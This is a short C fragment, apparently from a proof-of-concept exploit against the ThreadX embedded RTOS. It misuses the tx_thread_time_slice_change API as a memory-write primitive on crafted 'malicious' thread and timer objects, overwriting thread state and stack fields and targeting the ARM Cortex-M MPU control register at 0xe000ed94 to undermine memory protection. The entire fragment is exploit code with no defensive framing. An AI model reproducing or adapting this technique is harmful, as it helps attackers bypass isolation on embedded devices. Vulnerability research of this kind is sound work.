...
//  ULONG mpu_value = *mpu_pointer;
  ...
  ULONG time_slice;
  TX_THREAD *tempThread;
  // write thread_state
  tempThread = (ULONG) MaliciousThread + 24;
  tx_thread_time_slice_change(tempThread, 0x1, &time_slice);
  // write thread_stack_start
  tempThread = (ULONG) MaliciousTimer + 12;
  tx_thread_time_slice_change(tempThread, 0x54485244, &time_slice);
  tempThread = (ULONG) MaliciousTimer + 40;
  tx_thread_time_slice_change(tempThread, 0x54485244, &time_slice);
  tempThread = (ULONG) MaliciousTimer + 64;
  tx_thread_time_slice_change(tempThread, 0xe000ed94, &time_slice);
